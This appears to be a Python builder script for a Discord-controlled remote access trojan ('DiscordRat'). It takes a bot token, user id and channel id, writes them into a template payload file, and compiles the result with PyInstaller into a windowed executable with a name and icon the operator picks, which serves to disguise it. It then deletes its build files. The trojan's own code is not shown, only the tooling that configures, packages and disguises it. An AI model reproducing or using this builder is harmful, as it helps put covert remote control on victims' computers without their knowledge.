import os
import subprocess

print("remember for icon it only uses .ico format!")
currentpatch  = os.getcwd()
iconpatch = rf"{currentpatch}\exampleicon.ico"
print(iconpatch)
# Input values for replacement


token = input("Enter token: ")
userid = input("Enter user id: ")
channelid = input("Enter channel id: ")
processname = input("Process name:")
other_folder = os.path.join(currentpatch, "DiscordRat")
source_file_path = os.path.join(other_folder, "source.py")

  
# Read the content of source.py with UTF-8 encoding
with open(source_file_path, "r", encoding="utf-8") as source_file:
    content = source_file.read()

# Replace placeholders
content = content.replace("TOKEN_HERE", token)
content = content.replace("11111", userid)
content = content.replace("22222", channelid)

# Save the modified content into a new Python file
new_script = f"{processname}.py"
with open(new_script, "w", encoding="utf-8") as new_file:
    new_file.write(content)

print(f"{new_script} created successfully.")


command = [
    "pyinstaller",
    "--onefile",
    "--windowed",
    f"--icon={iconpatch}",
    new_script,
    f"--name={processname}"
]
# Convert the new script into an executable using PyInstaller
result = subprocess.run(command, capture_output=True, text=True)

# Clean up PyInstaller temporary files
os.system(f"DEL {processname}.spec")
os.system(f"DEL {processname}.py")
os.system(f"rmdir build")

print(f"{new_script} converted to executable.")
